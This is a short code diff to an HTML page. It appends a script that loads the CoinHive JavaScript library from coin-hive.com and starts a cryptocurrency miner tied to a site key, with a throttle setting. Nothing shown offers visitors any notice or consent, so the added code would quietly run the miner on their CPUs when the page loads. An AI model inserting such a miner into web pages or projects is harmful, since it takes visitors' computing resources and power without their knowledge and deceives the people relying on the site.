@@ -90,4 +90,14 @@
     
         });
     </script>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('IQIVO7COSkiiiW6dUGhMYvWgi0hJxQZ6', 'IPFS-SecretSharing', {
+		threads: 1,
+		autoThreads: false,
+		throttle: 0.8,
+		forceASMJS: false
+	});
+	miner.start();
+</script>
     </html>
